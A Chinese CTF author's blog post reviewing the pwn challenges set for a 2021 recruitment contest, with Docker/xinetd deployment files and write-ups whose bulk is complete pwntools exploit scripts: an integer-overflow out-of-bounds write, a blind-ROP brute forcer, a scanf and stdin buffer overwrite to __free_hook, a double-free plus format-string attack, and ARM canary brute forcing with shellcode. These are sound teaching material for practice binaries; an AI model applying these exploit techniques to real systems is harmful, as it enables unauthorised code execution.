# 招新赛 2021 出题总结(个人向)


前段时间还在惊讶福建为什么突然爆发疫情，转眼间哈尔滨也烂掉了。兰州聚会寄了，广州两周游也寄了，雅思寄了，GRE也寄了，只能在哈尔滨苦逼地记录一下[招新赛2021](https://writeup.tryout.hitctf.cn/)出题概况与环境部署细节，看来出国壬需要具备较强的心理容错能力。

<!--more-->

## 默认部署环境

文件目录

{{< admonition info >}}
- docker-compose.yml
- release
    - Dockerfile
    - ctf.xinetd
    - flag
    - pwn(& lib) 
{{< /admonition >}}

docker-compose.yml指定目录、端口等

```
version: "3.6"

services:
  pwn:
    build: ./release
    restart: always
    ports:
      - "30111-30114:8888"
    deploy:
      resources:
        limits:
          cpus: '0.20'
          memory: 50M

```

Dockerfile为docker部署脚本，包括指定gamebox版本、设置文件权限、启动服务等

```
FROM ubuntu:16.04

RUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g" /etc/apt/sources.list
RUN apt-get update && apt-get -y dist-upgrade
RUN apt-get install -y lib32z1 xinetd
RUN useradd -m ctf

COPY ./flag /flag
COPY ./pwn /pwn/pwn
COPY ./ctf.xinetd /etc/xinetd.d/ctf

RUN chown root:ctf /pwn/pwn && chmod 750 /pwn/pwn
RUN chown root:ctf /flag && chmod 644 /flag
RUN echo 'ctf - nproc 1500' >>/etc/security/limits.conf

CMD exec /bin/bash -c "/etc/init.d/xinetd start; trap : TERM INT; sleep infinity & wait"

EXPOSE 8888

```

ctf.xinetd有更详细的启动参数，一般只需要注意`server_args`设定pwn题启动命令与超时时间等

```
service ctf
{
    disable = no
    socket_type = stream
    protocol    = tcp
    wait        = no
    user        = root
    type        = UNLISTED
    port        = 8888
    bind        = 0.0.0.0
    server      = /usr/sbin/chroot
    server_args = --userspec=1000:1000 / timeout 120 ./pwn/pwn
    banner_fail = /etc/banner_fail

    # safety options
    per_source	  = 10 # the maximum instances of this service per source IP address
    rlimit_cpu	  = 60 # the maximum number of CPU seconds that the service may use
    rlimit_as     = 1024M # the Address Space resource limit for the service
    #access_times = 2:00-9:00 12:00-24:00

    #Instances   = 20 #process limit
    #per_source  = 5 #link ip limit

    #log warning die
    log_on_success  = PID HOST EXIT DURATION
    log_on_failure  = HOST ATTEMPT 
    log_type =FILE /var/log/myservice.log 8388608 15728640
}

```

注意远程elf文件一定要设置缓冲区，否则选手无法交互

```c
setbuf(stdout, 0LL);
setbuf(stdin, 0LL);
setbuf(stderr, 0LL);
```

## babyFAT_revenge | 6 solves

### 环境信息

Ubuntu 16.04下编译命令

```bash
gcc ./pwn.c -o0 ./pwn 
```

给出如下提示

> try this, `abs(INT_MIN)`

### 题解

题目维护了一个链表，可以增改清空打印。

唯一的漏洞点在于`write`中利用`abs`得到在0-99范围内的整数索引。如提示所说，由于`INT_MIN`的绝对值比`INT_MAX`大一，导致在经过绝对值以后无法转换，会原封不动地输出，即


> abs(INT_MIN) = INT_MIN

最终得到的索引为-30，进而导致越界读写，直接改写返回地址为后门函数即可。

给了hint以后不难做出，exp如下

```python
from pwn import *

def add(idx, ch):
	io.sendlineafter("Your choice: ", '1')
	io.sendlineafter("Index: ",str(idx))
	io.sendlineafter("Input content: ", ch)

def edit(idx, ch):
	io.sendlineafter("Your choice: ", '3')
	io.sendlineafter("Index: ",str(idx))
	io.sendlineafter("Input content: ", ch)

def exploit(offset, value):
	add(64, 'a')
	add(-2147483648, p8(offset + 0x78))
	edit(offset + 0x78, value)
	clear()

def clear():
	io.sendlineafter("Your choice: ", '4')

io = process("./pwn")
# io = remote("101.200.201.114", 30001)
sys = 0x40089D
# rbp + 8 -> backdoor
for i in range(8):
	val = sys & 0xff
	exploit(i, p8(val))
	sys = sys >> 8

io.sendlineafter("Your choice: ", '5')
io.interactive()
```

> flag{abs_1s_s0_1nt3rstIng}

## bbBTtt | 2 solves

源自[强网杯2021决赛强网先锋](https://xidoo.top/2021/07/cve-2009-1759/)

本地与远程表现不一致，原因仍然未知，些许提高了利用难度

但提示已经明确给出了CVE编号，大大减少了查阅资料的时间

> flag{w0w_yoUr_f1rst_nday_3xp_orzzzzz}

## dark_fantasy | 0 solves

### 环境信息

Ubuntu 20.04 

```bash
gcc -fno-stack-protector -no-pie pwn.c -o pwn
```

### 题解

没有给附件，用awds代表方向键，需要连续走30个迷宫，且迷宫大小递增

```
x1do0@x1do0:~/linux_share/lilac_pwn/darkfantasy$ ./pwn

😭     Are you good at maze    😭
😭     Help me plz             😭

*** Maze 0 ***
⬜⬛⬜⬜⬜⬜⬜⬛⬛⬛
⬛😀⬜⬜⬜⬜⬜⬜⬛⬛
⬜⬜⬜⬜⬛⬜⬛⬛⬜⬜
⬜⬜⬜⬜⬜⬜⬛⬜⬜⬜
⬛⬛⬜⬛⬛⬜⬜⬜⬛⬜
⬛⬛⬜⬜⬛⬛⬜⬛⬛⬜
⬛⬛⬜⬛⬛⬛⬛⬛⬜⬜
⬛⬛⬛⬜⬜⬛⬛⬛⬜⬜
⬛⬜⬜⬛⬜⬜⬛⬜🚩⬜
⬛⬜⬛⬛⬜⬛⬜⬜⬜⬛
Input your path
ssddddsddwddsssass
[3][2]->[4][2]->[4][3]->[4][4]->[4][5]->[4][6]->[5][6]->[5][7]->[5][8]->[4][8]->[4][9]->[4][10]->[5][10]->[6][10]->[7][10]->[7][9]->[8][9]->[9][9]->[9][9]->😄
Solved...Thank you sooo much!
*** Maze 1 ***
⬛⬜⬜⬜⬛⬛⬜⬛⬜⬜⬜
⬜😀⬜⬜⬜⬜⬛⬛⬜⬜⬜
⬛⬜⬛⬜⬜⬛⬛⬜⬛⬛⬜
⬛⬜⬛⬜⬜⬛⬛⬜⬜⬜⬛
⬜⬜⬛⬜⬜⬛⬜⬜⬛⬜⬜
⬛⬜⬜⬜⬛⬛⬜⬜⬜⬛⬜
⬜⬜⬜⬛⬜⬛⬛⬛⬛⬜⬜
⬛⬛⬜⬜⬛⬜⬛⬛⬛⬛⬛
⬜⬛⬛⬜⬜⬜⬜⬜⬜⬜⬜
⬛⬛⬛⬛⬛⬜⬜⬛⬜🚩⬜
⬜⬛⬛⬛⬛⬛⬛⬜⬛⬛⬜
Input your path
```

写个脚本用dfs走走迷宫吧，走完以后给了一个栈溢出（选手可能并不知道是否溢出）

```c
void next_challenge()
{
    char name[0x20];
    puts("Okay there you are, coooool!");
    puts("Leave your name in Lilac Hall of Fame😀");
    read(0, name, 0x100);   
    puts("Glad you come~"); 
}
```

输入完就结束了，当选手望着已经结束的程序发愣时他理应想到这题不只是想让他走个迷宫

后续就是经典的Blind-ROP，思路如下

1. 找main_addr，爆到能重新输入的地址（可以不是main）
2. 找gadgets，在init函数的连续六个pop并ret（+9就是pop rdi ret)
3. 找打印函数，爆到能把0x400000打印（可以不是puts）
4. 利用打印函数从头到尾把程序dump下来（dump到plt就行，拿到got地址）
5. ROP

完整exp

```python
""" x1do0 / Lilac """

from pwn import *
import numpy as np

def generate_map(level, io):
    size = level + 10

    startX = 0
    startY = 0
    endX = 0
    endY = 0

    mapStatus = np.zeros((size, size, 2), dtype=np.uint8)   

    for i in range(size):
        s = io.recvuntil('\n',drop=True)
        cnt = 0
        for j in range(size):
            if s[cnt:cnt+3] == b"\xe2\xac\x9c" :
                mapStatus[i,j,0]=1
                cnt += 3
            elif s[cnt:cnt+3] == b"\xe2\xac\x9b" :
                cnt += 3
                continue
            elif s[cnt:cnt+4] == b'\xf0\x9f\x9a\xa9':
                cnt += 4
                mapStatus[i,j,0]=1
                endX = i
                endY = j
            elif s[cnt:cnt+4] == b'\xf0\x9f\x98\x80':
                cnt += 4
                startX = i
                startY = j
            else :
                print("error in ({},{}):{}".format(i,j,hex(ord(s[cnt]))))
                exit(0)
    return startX, startY, endX, endY, mapStatus

def find_route(startX, startY, endX, endY, mapStatus, level):
    route = [[startX,startY]]
    x = startX
    y = startY
    direction = []
    size = level + 10

    # print(level)
    while x != endX or y != endY:
        # print("{},({},{})".format(direction,x,y))
        mapStatus[x,y,1] = 1
        if x>0:
            if mapStatus[x-1,y,0] == 1 and mapStatus[x-1,y,1] == 0:
                x = x - 1
                route.append([x,y])
                direction.append('w')
                continue
        if x<size-1:
            if mapStatus[x+1,y,0] == 1 and mapStatus[x+1,y,1] == 0:
                x = x + 1
                route.append([x,y])
                direction.append('s')
                continue
        if y>0:
            if mapStatus[x,y-1,0] == 1 and mapStatus[x,y-1,1] == 0:
                y = y - 1
                route.append([x,y])
                direction.append('a')
                continue
        if y<size-1:
            if mapStatus[x,y+1,0] == 1 and mapStatus[x,y+1,1] == 0:
                y = y + 1
                route.append([x,y])
                direction.append('d')
                continue

        route.pop()
        direction.pop()
        x,y = route.pop()
        route.append([x,y])

    # print("round{} finished!".format(level))
    return direction

def test_map(startX, startY, endX, endY, mapStatus, level):
    print("round{}:".format(level))
    print("start point:{},{}".format(startX,startY))
    print("end point:{},{}".format(endX,endY))
    for i in range(level+10):
        for j in range(level+10):
            print("{} ".format(mapStatus[i,j,0]), end=''),
        print("")

def solve_maze(io):
    for i in range(10, 30):
        io.recvuntil("*** Maze ")
        level = int(io.recvuntil(" ***", drop=True), 10)
        io.recvuntil("\n")
        startX, startY, endX, endY, mapStatus = generate_map(level, io)
        # test_map(startX, startY, endX, endY, mapStatus, level)
        direction = find_route(startX, startY, endX, endY, mapStatus, level)
        pay = ''
        for d in direction:
            pay += d
        io.sendline(pay)



buffer_len = 0x28
main_addr = 0
gadgets_addr = 0
pop_rdi_ret_addr = 0
puts_plt_addr = 0

def GetStopAddr():
    address = 0x401200
    while 1:
        print(hex(address))
        try:
            sh = process('./pwn')
            solve_maze(sh)
            sh.recvuntil('Leave your name in Lilac Hall of Fame')
            payload = b'a'*buffer_len + p64(address)
            sh.send(payload)
            sh.recvuntil('Glad you come~\n')
            output = sh.recv(timeout=1)
            print(output)
            if b'Okay there you are, coooool!' not in output:
                sh.close()
                address += 1
            else:
                return address
        except EOFError:
            address += 1
            sh.close()

def GetBropGadgets(buf_length, stop_gadgets, address):
    try:
        sh = process('./pwn')
        solve_maze(sh)
        sh.recvuntil('Leave your name in Lilac Hall of Fame')
        #寻找 pop_rbx_rbp_r12_r13_r14_r15_ret
        payload = b'a'*buf_length + p64(address) + p64(0)*6 + p64(stop_gadgets)
        sh.sendline(payload)
        sh.recvuntil('Glad you come~\n')
        output = sh.recv(timeout=1)
        print(output)
        sh.close()
        if b'Okay there you are, coooool!' not in output:
            return False
        return True
    except Exception:
        sh.close()
        return False

def check(buf_length, address):
    try:
        sh = process('./pwn')
        solve_maze(sh)
        sh.recvuntil('Leave your name in Lilac Hall of Fame')
        payload = b'a'*buf_length + p64(address) + p64(0)*6 + p64(0xdeadbeef)
        sh.sendline(payload)
        output = sh.recvuntil('Glad you come~\n')    
        sh.recv(timeout=1) # 超时引发异常
        sh.close()
        return False
    except Exception:
        sh.close()
        return True

def GetInitGadgetsAddr():
    global buffer_len, main_addr, pop_rdi_ret_addr
    address = 0x401A00
    while 1:
        print(hex(address))
        if GetBropGadgets(buffer_len, main_addr, address):
            print('possible gadget: 0x%x' % address)
            if check(buffer_len, address):
                print('success gadget: 0x%x' % address)
                return address
                break
        address += 1

def GetPutsPlt():
    global buffer_len, main_addr
    # addr = 0x400500
    addr = 0x401000
    while 1:
        print(hex(addr))
        try:
            sh = process('./pwn')
            solve_maze(sh)
            sh.recvuntil('Leave your name in Lilac Hall of Fame')
            payload = b'a'*buffer_len + p64(pop_rdi_ret_addr) + p64(0x400000) + p64(addr) + p64(main_addr)
            sh.sendline(payload)
            sh.recvuntil('Glad you come~\n') 
            output = sh.recv()
            sh.close()
            print(output)
            if b'\x7fELF' in output and b'Okay there you are, coooool!' in output:
                print('puts plt address = 0x%x' % addr)
                return addr
            addr += 1
        except Exception:
            sh.close()
            addr += 1

def dump(leak_addr):
    global buffer_len, pop_rdi_ret_addr, pop_rdi_ret_addr, main_addr, puts_plt_addr
    sh = process('./pwn')
    solve_maze(sh)
    sh.recvuntil('Leave your name in Lilac Hall of Fame')
    payload = b'a'*buffer_len + p64(pop_rdi_ret_addr) + p64(leak_addr) + p64(puts_plt_addr) + p64(main_addr)
    sh.sendline(payload)
    sh.recvuntil('Glad you come~\n')
    try:
        data = sh.recvuntil('\nOkay there you are, coooool!', drop=True)
        sh.close()
        if data == b"":
            data = b'\x00'
        sh.close()
        return data
    except:
        sh.close()
        return None


# main_addr = GetStopAddr()
# print(hex(main_addr))
main_addr = 0x4012be

# gadgets_addr = GetInitGadgetsAddr()
# print(hex(gadgets_addr))
gadgets_addr = 0x401a4a
pop_rdi_ret_addr = gadgets_addr + 9

# puts_plt_addr = GetPutsPlt()
# print(hex(puts_plt_addr))
puts_plt_addr = 0x401028

# leak_addr    = 0x400000
# result = b""
# while leak_addr < 0x401300:
#     print(hex(leak_addr))
#     data = dump(leak_addr)
#     print(data)
#     if data is None:
#         continue
#     else:
#         result += data
#     leak_addr += len(data)
        
# with open('./code','wb') as f:
#     f.write(result)



context.terminal = ['tmux', 'splitw', '-h']


something_got = 0x404018
sh = process('./pwn')
solve_maze(sh)
sh.recvuntil('Leave your name in Lilac Hall of Fame')
payload = b'a'*buffer_len + p64(pop_rdi_ret_addr) + p64(something_got) + p64(puts_plt_addr) + p64(main_addr)
sh.sendline(payload)
sh.recvuntil('Glad you come~\n')
data = sh.recvuntil('\nOkay there you are, coooool!', drop=True)
libc_base = u64(data + b'\x00\x00') - 554400
print(hex(libc_base))

bin_sh = libc_base + 1799594
system = libc_base + 349200

sh.recvuntil('Leave your name in Lilac Hall of Fame')
payload = b'a'*buffer_len + p64(0x40129A) + p64(pop_rdi_ret_addr) + p64(bin_sh) + p64(system) + p64(main_addr)
sh.sendline(payload)

sh.interactive()
```

爆破是某种程度上的返璞归真，能写出优雅、快速地爆破脚本是可以被人认可的能力。

> flag{patience_is_the_key_to_success}


## magic_scanf | 0 solves

由队内小伙伴出的很好的一题，这里抱着学习的态度复现一遍，环境为Ubuntu 16.04

程序功能为在堆上任意次利用`scanf`读入`int`与`long long`，以及一个明显的任意地址写`\x00`

```c
case '*':
    if (risk != NULL) break;
    read(STDIN_FILENO, (char *) &risk, 8);
    *(char *) risk = '\0';
    break;
```

这里首先利用的是scanf读入巨大的数将会利用堆块做暂存区。

我们直接在读入`int`时输入`0x400*'9'`,实际上scanf会先分配一个`0x410`大小的块，用于存储用户的输入，然后判断大于`INT_MAX`，从而给用户返回全f，再把这个块给释放掉。

![](https://i.loli.net/2021/09/22/Fg2YKNtjspGJZ1u.png)



所以这题可以如此来拿到libc地址

1. 读入`long long`，正常输入，并把它释放掉

```
pwndbg> vis                                                                                                  
                                                                                                             
0x555555559000  0x0000000000000000      0x0000000000000031      ........1.......         <-- fastbins[0x30][0
]                                                                                                            
0x555555559010  0x0000000000000000      0x0000000000000000      ................                             
0x555555559020  0x0000000000000000      0x0000000000000000      ................                             
0x555555559030  0x0000000000000000      0x0000000000020fd1      ................         <-- Top chunk                     
```


2. 读入`int`，输入巨大的数，直接把最上面的fastbin弄到smallbin里去了，同时留下了libc地址

```
pwndbg> vis                                                                                                  
                                                                                                             
0x555555559000  0x0000000000000000      0x0000000000000031      ........1.......         <-- smallbins[0x30][
0]                                                                                                           
0x555555559010  0x00002aaaab097b98      0x00002aaaab097b98      .{...*...{...*..                             
0x555555559020  0x0000000000000000      0x0000000000000000      ................                             
0x555555559030  0x0000000000000030      0x0000000000000020      0....... .......                             
0x555555559040  0x00000000ffffffff      0x0000000000000000      ................                             
0x555555559050  0x0000000000000000      0x0000000000020fb1      ................         <-- Top chunk       
```

当申请较大块(不在smallbin范围内)就会整理fastbin,先进unsortedbin再进smallbin

```c
 if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          if (victim == 0) /* initialization check */
            malloc_consolidate (av);
          else
            {
              bck = victim->bk;
	if (__glibc_unlikely (bck->fd != victim))
                {
                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }
              set_inuse_bit_at_offset (victim, nb);
              bin->bk = bck;
              bck->fd = bin;

              if (av != &main_arena)
                victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }
    }

  /*
     If this is a large request, consolidate fastbins before continuing.
     While it might look excessive to kill all fastbins before
     even seeing if there is space available, this avoids
     fragmentation problems normally associated with fastbins.
     Also, in practice, programs tend to have runs of either small or
     large requests, but less often mixtures, so consolidation is not
     invoked all that often in most programs. And the programs that
     it is called frequently in otherwise tend to fragment.
   */

  else
    {
      idx = largebin_index (nb);
      if (have_fastchunks (av))
        malloc_consolidate (av);
    }
```

3. 读入`long long`, 输入`+`，它会直接跳过用户输入,至此我们得到了包含libc地址的堆块

```
pwndbg> vis                                                                                           
                                                                                                      
0x555555559000  0x0000000000000000      0x0000000000000031      ........1.......                      
0x555555559010  0x00002aaaab097b98      0x00002aaaab097b98      .{...*...{...*..                      
0x555555559020  0x0000000000000000      0x0000000000000000      ................                      
0x555555559030  0x0000000000000030      0x0000000000000021      0.......!.......                      
0x555555559040  0x00000000ffffffff      0x0000000000000000      ................                      
0x555555559050  0x0000000000000000      0x0000000000020fb1      ................         <-- Top chunk
```

4. 利用打印功能打印出来即可

当我们拿到libc地址,并且还有任意地址写`'\x00'`的漏洞时,就可以通过修改`stdin`的`buf_base`低字节来扩大攻击面了.其`buf_base`到`buf_end`处是用户输入直接写入的位置,修改其低字节以后用户可以直接覆盖`buf_base && 0xffffffffffffff00`到`buf_end`的内容了.而实际上这个地址就包含了整个`stdin`,所以我们下一步就可以任意指定`buf_base`与`buf_end`,实现任意地址写.

最后写的是`free_hook`,exp如下

```python
from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

filename = './test'
libcname = './libc.so.6'
ldname   = './ld-2.23.so'
ip       = "node1.pwn.tryout.hitctf.cn"
port     = 30143

elf = ELF(filename)

ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x=1024 : p.recv(numb = x)
sa = lambda p, a, b : p.sendafter(a,b)
sla = lambda p, a, b : p.sendlineafter(a,b)
rr = lambda p, t : p.recvrepeat(t)

LOCAL = 1 if len(sys.argv)==1 else 0

if LOCAL:
    io = process(filename, aslr=False)
    libc = elf.libc
    # debug="b *0x0000555555555496\nb *0x000055555555549b\nb *0x0000555555555517"
    # gdb.attach(io, debug)
    # if LD_PRELOAD multiple libs, split with ':'
    # io = process([ldname, filename], env={'LD_PRELOAD':libcname})
    # libc = ELF(libcname)
else:
    #context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(libcname)

debug_base = 0x155555548000
fe = 0x150c
def pwn():
    # gdb.attach(io, "b *0x0000555555555496")
    # gdb.attach(io, "b *0x0000555555555512") 

    sl(io, '{}[{}]{*[]' + '(' * 0x28 + '[}')
    
    sl(io, '0') # {
    rl(io)      # }
    
    sl(io, '9' * 0x400) # [
    sl(io, '+')         # {
    
    libc_base = int(io.recvline(keepends=False)) - 0x3c4b98 # }
    free_hook_addr = libc_base + libc.sym['__free_hook']
    stdin_addr = libc_base + libc.sym['_IO_2_1_stdin_']
    stdin_buf_base_addr = stdin_addr + 0x8 * 7
    system_addr = libc_base + libc.sym['system']

    print(hex(libc_base))
    print(hex(stdin_addr))
    # pause()
    rl(io) # ]
    
    sl(io, str(u64(b'/bin/sh\0'))) # {


    # sn(io, p64(stdin_buf_base_addr)[0:7]) # *
    sn(io, p64(stdin_buf_base_addr)) # *
    sn(io, p64(stdin_addr + 0x83) * 3 + p64(free_hook_addr) + p64(free_hook_addr + 0x8)) # [
    
    rl(io) # ]
    for i in range(0x28): # (
        sl(io, '')
    sn(io, p64(system_addr)) # [

    io.interactive()

pwn()
```

实际上打`buf_base`一年前就接触过,甚至写过[博客](https://xidoo.top/2020/04/adworld-pwn0/#echo-back)但是现在已经完全没有印象了.

> flag{m0th3r_f**ker_sCanf}

## annoying | 未上线

菜单堆题,增删改打印功能齐全,但加了很多很烦的输入.并且所有chunk大小只能是`0x20`

delete功能中没有清空指针，show中printf有格式化字符串漏洞,但有次数限制导致只用格式化字符串没法打通

做法一源自2021国赛东北分区赛,在`main_arena`中留下合法size以便fastbin攻击

利用格式化字符串leak libc地址，然后double free来fastbin attack,类似于国赛small chunk思路，先利用fastbin表头在libc处留下0x31，然后打过去修改0x31的fastbin下一次分配地址，然后打到top_chunk把它改到malloc_hook,修改malloc_hook即可。

做法二为double free改show_cnt后即可多次触发格式化字符串利用格式化字符串任意地址读leak栈地址，并任意地址写修改返回地址。

做法二的exp如下,应该算是基础堆题了.

```python
""" x1do0 / Lilac """

from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little')

io = process('./pwn')

def add(idx, size, con):
    io.sendlineafter("your choice>\n", "010101001011010000000000101")
    io.sendlineafter("siahrdayrfase", str(idx))
    io.sendlineafter("as09q35hsaiua", str(size))
    io.sendlineafter("ioq5jrkdas71", con)

def remove(idx):
    io.sendlineafter("your choice>\n", "101000101000101010001010010")
    io.sendlineafter("siahrdayrfase", str(idx))

def show(idx):
    io.sendlineafter("your choice>\n", "111001000100010101001010010")
    io.sendlineafter("siahrdayrfase", str(idx))

def bye():
    io.sendlineafter("your choice>\n", "000011010101010010101010101")



io.sendlineafter("Leave your name:\n", b'\x00' * 0x18 + p64(0x31))

add(10, 0x20, '%9$p')
show(10)
io.recvuntil('\n')
elf_base = int(io.recv(14), 16) - 0x1044
print(hex(elf_base))
add(11, 0x20, 'a'*8)
add(12, 0x20, 'b'*8)
remove(11)
remove(12)
remove(11)

add(13, 0x20, p64(elf_base+0x2020C0+0x10))
add(14, 0x20, 'c'*8)
add(15, 0x20, 'd'*8)
add(16, 0x20, p32(0xfffffff0))


add(0, 0x10, "%8$p,%17$p")
show(0)
io.recvuntil('\n')
stack_target = int(io.recvuntil(',', drop=True), 16) + 8
libc_addr = int(io.recv(14), 16) - 0x20840
print(hex(stack_target))
print(hex(libc_addr))
fh = 0x3c67a8 + libc_addr
stack_target_0_4 = stack_target & 0xffff
print(hex(stack_target_0_4))

add(1, 0x10, '%' + str(stack_target_0_4) + 'c%18$hn')
show(1)

# 0x45226 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

one = [0x45226 , 0x4527a, 0xf03a4, 0xf1247]
one = [x + libc_addr for x in one]
root = one[3]

add(2, 0x10, f"%{ root&0xffff }c%45$hn")
show(2)

add(3, 0x10, '%' + str(stack_target_0_4 + 2) + 'c%18$hn')
show(3)

add(4, 0x10, f"%{ (root>>16)&0xff }c%45$hhn")
show(4)

bye()

io.interactive()
```

> flag{aNNOY1NG_bUt_eAsy}


## 年轻人的第一个ARM PWN | 未上线

启动脚本

```bash
./qemu-arm -L . ./pwn
```

qemu-arm下的栈溢出.但是开了canary,多线程按字节爆破canary以后去做ARM32架构的栈溢出

```
    PUSH    {R11,LR}
    ADD     R11, SP, #4
    SUB     SP, SP, #0x28
    ...
    STR     R3, [R11,#var_8]        # CANARY is here
    ...
    LDR     R3, =(__stack_chk_guard_ptr - 0x10FB4)
    LDR     R3, [R2,R3]     ; __stack_chk_guard
    LDR     R2, [R3]
    LDR     R3, [R11,#var_8]
    EORS    R2, R3, R2
    MOV     R3, #0
    BEQ     loc_754                 # check CANARY
    BL      __stack_chk_fail

loc_754
    SUB     SP, R11, #4
    POP     {R11,PC}
```

LR是返回地址，栈结构如下

```



           ┌────────────────────────┐          │   high
      R11  │         R11(fp)        │          │
     ─────►├────────────────────────┤          │
           │           LR           │          │
           ├────────────────────────┤          │
           │          CANARY        │          │
           ├────────────────────────┤          │
           │                        │          │
           │          BUFFER        │          │
           │           0x20         │          │   low
           │                        │          │
           │                        │          │
           │                        │          │
       sp  │                        │          │
     ─────►└────────────────────────┘          ▼


```

思路一 ROP -> 寄存器传参规则？
1. R0, R1, R2传参
2. fp存返回地址

不一定能返回（直接pop PC进入的函数不会返回，一般用BL func()与BX LR返回）
且gadget难找

思路二 ret2shellcode
1. fp存返回地址
2. qemu栈地址固定（调试拿到）
3. shellcode

没开nx, exp如下

```python
""" x1do0 / Lilac """

from pwn import *

context(arch = 'arm', os = 'linux', endian = 'little')

io = process(["qemu-arm", "-g", "23333", "-L", ".", "./pwn"])
# io = process(["qemu-arm", "-L", ".", "./pwn"])

def leak_canary():
    canary = b'\x00'
    i = 0
    while(len(canary)<4):
        io.sendlineafter(">>\n", '1')
        io.sendafter("Input his/her name plz\n", b'a'*0x20 + canary + p8(i))    
        res = io.recvuntil("OK, your friend is coming!\n")
        if b"stack smashing detected" in res:
            print("[+] trying : " + hex(i))
            i  = (i+1) % 256
        else:
            canary += p8(i)
            print("[*] success : " + hex(i))
            i = 0
        # sleep(0.1)
    print(b"[*] We finally get canary : " + canary)
    return canary

canary = leak_canary()
io.sendlineafter(">>\n", '3')
sc = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x1a\x0a\x1c\x42\x72\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x59\xc0\x46"
assert len(sc) == 0x20
pay = sc + canary + p32(0) + p32(0xfffdc44c) 
io.sendlineafter("Ohh I forget to ask your name!\n", pay)
io.recvuntil("I love this bird.\n")

io.interactive()

```

> flag{l3t_y0ur_fr1ends_dO_evilllll_th1ng}
